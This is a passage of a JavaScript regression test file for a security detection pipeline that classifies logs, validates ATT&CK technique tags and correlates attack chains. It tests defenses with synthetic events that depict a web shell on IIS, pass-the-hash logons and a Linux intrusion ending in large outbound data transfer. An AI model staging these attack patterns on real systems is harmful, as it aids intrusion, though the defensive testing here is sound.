      message: 'Accepted password for admin from 2.3.4.5 port 55001 ssh2' }),
    // Linux: cron modification
    GLC.classify({ format: 'syslog', program: 'cron', message: '(root) EDIT (admin)' }),
    // Firewall: large outbound
    GLC.classify({ source: 'iptables',
      raw: { action: 'ALLOW', src_ip: '10.0.0.1', dst_ip: '2.3.4.5', bytes_sent: '60000000' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const crossChain = result.chains.find(c => c.id === 'CROSS-LINUX-EXFIL');
  assert(crossChain != null, '10.3 Cross-domain Linux→Exfil chain detected');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 11: Multi-Source Attack Scenario — No False Positives
// ─────────────────────────────────────────────────────────────────────────────
group('Group 11: Multi-Source Scenario — Zero False Positive Assignments');

// 11.1 Mixed Windows auth batch: no T1190 assignments
{
  const events = [
    GLC.classify({ eventId: '4624', raw: { EventID: '4624', LogonType: '3' } }),
    GLC.classify({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } }),
    GLC.classify({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } }),
    GLC.classify({ eventId: '4672', raw: { EventID: '4672' } }),
  ];
  const dets = [
    makeDet(['attack.t1190'],    { event: events[0] }), // web attack on auth events
    makeDet(['attack.t1021.002'],{ event: events[0] }), // SMB on single-host auth
    makeDet(['attack.t1059.004'],{ event: events[0] }), // Unix shell on Windows
    makeDet(['attack.t1053.003'],{ event: events[0] }), // Cron on Windows
  ];
  const validated = CEA.validateBatch(dets, events);
  // All 4 should be suppressed (no web, no multi-host, no Linux events)
  const remainingTechTags = validated.flatMap(d => d.tags || []).filter(t => t.match(/attack\.t/));
  const suppressedCorrectly = !remainingTechTags.some(t =>
    ['t1190','t1021.002','t1059.004','t1053.003'].some(bad => t.includes(bad)));
  assert(suppressedCorrectly, '11.1 All false-positive techniques stripped from mixed Windows auth batch');
}

// 11.2 Legitimate multi-host PtH scenario — T1550.002 allowed
{
  const events = ['HOST1','HOST2','HOST3'].map(h => GLC.classify({
    eventId: '4624', computer: h,
    raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM', IpAddress: '10.0.0.5' }
  }));
  const ceaCtx = CEA.buildEvidence(events);
  const pth = CEA.validateTechnique('T1550.002', ceaCtx, events[0]);
  assert(pth.allowed, '11.2 T1550.002 correctly allowed in legitimate multi-host NTLM scenario');
}

// 11.3 Web exploitation + process spawn — T1190 + T1505.003 allowed
{
  const events = [
    GLC.classify({ source: 'iis', raw: { 'cs-method': 'POST', 'cs-uri-stem': '/shell.aspx' } }),
    GLC.classify({ eventId: '4688', parentProc: 'w3wp.exe', process: 'cmd.exe',
      raw: { EventID: '4688', ParentImage: 'w3wp.exe' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const t1190 = CEA.validateTechnique('T1190', ceaCtx, events[0]);
  const t1505 = CEA.validateTechnique('T1505.003', ceaCtx, events[1]);
  assert(t1190.allowed, '11.3 T1190 correctly allowed in IIS + web shell scenario');
  assert(t1505.allowed, '11.4 T1505.003 correctly allowed with w3wp.exe parent');
}

// 11.4 Determinism check: same events produce same result twice
{
  const events = [
    GLC.classify({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } }),
    GLC.classify({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } }),
    GLC.classify({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } }),
  ];
  const ctx1 = CEA.buildEvidence(events);
  const ctx2 = CEA.buildEvidence(events);
  const r1 = CEA.validateTechnique('T1110.001', ctx1, events[0]);
  const r2 = CEA.validateTechnique('T1110.001', ctx2, events[0]);
  assert(r1.allowed === r2.allowed, '11.5 Determinism: same input → same CEA result');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 12: CEA Metrics & Audit Log
// ─────────────────────────────────────────────────────────────────────────────
group('Group 12: CEA Metrics & Audit Log');

CEA.resetMetrics();
CEA.resetAuditLog();

// 12.1 Metrics increment on blocked technique
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  CEA.validateTechnique('T1190', ctx, events[0], {}, {});
  const metrics = CEA.getMetrics();
  assert(metrics.blocked_source >= 1, '12.1 blocked_source metric increments on T1190/4624');
  assert(metrics.total_evaluated >= 1, '12.2 total_evaluated metric increments');
}

// 12.3 Audit log captures decision
{
  const log = CEA.getAuditLog();
  assert(log.length >= 1, '12.3 Audit log has at least one entry');
  const hasBlocked = log.some(e => e.tid === 'T1190' && e.decision === 'blocked_source');
  assert(hasBlocked, '12.4 Audit log records T1190 blocked_source decision');
}

// 12.5 Metrics include fp_reason_breakdown
{
  const metrics = CEA.getMetrics();
  assert(typeof metrics.fp_reason_breakdown === 'object', '12.5 fp_reason_breakdown is an object');
  const hasT1190reason = Object.keys(metrics.fp_reason_breakdown).some(k => k.includes('T1190'));
  assert(hasT1190reason, '12.6 fp_reason_breakdown includes T1190 suppression reason');
}

// 12.7 GLC metrics track domain breakdown
{
  GLC.resetMetrics();
  GLC.classifyBatch([
    { eventId: '4624', raw: { EventID: '4624' } },
    { format: 'syslog', program: 'sshd', message: 'Failed password for root' },
    { source: 'apache', raw: { 'cs-method': 'GET' } },
    { source: 'iptables', raw: { action: 'BLOCK', src_ip: '1.2.3.4' } },
    { source: 'mysql', raw: { query: 'SELECT 1' } },
  ]);
  const glcMetrics = GLC.getMetrics();
  assert(glcMetrics.classified === 5, '12.7 GLC classified 5 events');
  assert(glcMetrics.domain_breakdown.windows_security >= 1, '12.8 windows_security in domain breakdown');
  assert(glcMetrics.domain_breakdown.linux >= 1, '12.9 linux in domain breakdown');
  assert(glcMetrics.domain_breakdown.web >= 1, '12.10 web in domain breakdown');
  assert(glcMetrics.domain_breakdown.firewall >= 1, '12.11 firewall in domain breakdown');
  assert(glcMetrics.domain_breakdown.database >= 1, '12.12 database in domain breakdown');
}

// 12.13 BCE metrics track chains
{
  BCE.resetMetrics();
  const events = Array(4).fill(0).map(() => GLC.classify({
    eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' }
  }));
  events.push(GLC.classify({ eventId: '4624', raw: { EventID: '4624' } }));
  BCE.correlate(events, [], CEA.buildEvidence(events));
  const bceMetrics = BCE.getMetrics();
  assert(bceMetrics.batches_processed >= 1, '12.13 BCE batches_processed increments');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 13: Module Override Prevention
// ─────────────────────────────────────────────────────────────────────────────
group('Group 13: Module Override Prevention');

// 13.1 Detection already CEA-validated passes unchanged through validateBatch
{
  const det = {
    ruleId: 'BCE-TEST', tags: ['attack.t1059.001'],
    _ceaValidated: true, confidence: 80
  };
  const events = [];
  const result = CEA.validateBatch([det], events);
  assert(result[0]._ceaValidated === true, '13.1 Pre-validated detection passes through unchanged');
  assert(result[0].tags?.includes('attack.t1059.001'), '13.2 Valid tags preserved on pre-validated detection');
}

// 13.2 Attempt to re-add suppressed technique — CEA strips it
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  // Simulate an AI or module that added T1190 back after CEA suppressed it
  const tampered = [{
    ruleId: 'AI-ENRICHED', tags: ['attack.t1190', 'attack.t1078'],
    confidence: 90, event: events[0], _ceaValidated: false
  }];
  const ctx = CEA.buildEvidence(events);
  const result = CEA.validateBatch(tampered, events);
  const tags = result[0]?.tags || [];
  assert(!tags.some(t => t.includes('t1190')), '13.3 Attempt to re-add T1190 via AI module → stripped by CEA');
  assert(result[0]?._ceaValidated === true, '13.4 Detection marked as CEA-validated after re-processing');
}

// 13.3 GLC _meta cannot be overwritten (immutable)
{
  const evt = GLC.classify({ eventId: '4624', raw: { EventID: '4624' } });
  let threw = false;
  try {
    evt._meta.domain = 'web'; // attempt override
  } catch (e) {
    threw = true; // strict mode throws on frozen object mutation
  }
  // Either throws or silently fails — domain must remain unchanged
  assert(evt._meta.domain !== 'web', '13.5 GLC _meta.domain is immutable (cannot be overridden)');
}

// ─────────────────────────────────────────────────────────────────────────────
//  SUMMARY
// ─────────────────────────────────────────────────────────────────────────────
const total = passed + failed;
console.log('\n' + '═'.repeat(64));
console.log(`  REGRESSION TEST SUMMARY — Global Detection Pipeline v2.0`);
console.log('═'.repeat(64));
console.log(`  Total : ${total}`);
console.log(`  Passed: ${passed} ✅`);
console.log(`  Failed: ${failed} ${failed > 0 ? '❌' : '✅'}`);

if (failures.length > 0) {
  console.log('\n  FAILURES:');
  failures.forEach(f => console.log(f));
}

console.log('═'.repeat(64));

if (failed > 0) process.exit(1);
else process.exit(0);
